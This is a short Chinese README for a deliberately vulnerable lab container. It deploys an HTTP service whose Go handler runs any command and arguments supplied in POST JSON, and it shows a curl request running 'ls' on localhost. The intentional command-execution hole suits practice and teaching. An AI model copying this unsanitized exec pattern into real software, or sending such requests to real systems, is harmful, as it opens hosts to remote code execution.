# 任意代码执行漏洞靶机


## 环境部署

```bash
## debian:buster
docker run --rm -d -p 8081:8080 doslab/vulhub-reflect2:latest

## distroless/debian-static10
docker run --rm -d -p 8082:8080 doslab/vulhub-reflect2:static
```

## 漏洞使用

核心代码如下， 拿到 POST Json 中的所有信息， 组装成 shell 命令并执行

```golang
out, err := exec.Command(c.Command, c.Args...).Output()
```

```bash
curl -X POST http://127.0.0.1:8081/v0/cmd -d '{
    "command":"ls",
    "args":["-l","-a","-h"]
}'
```



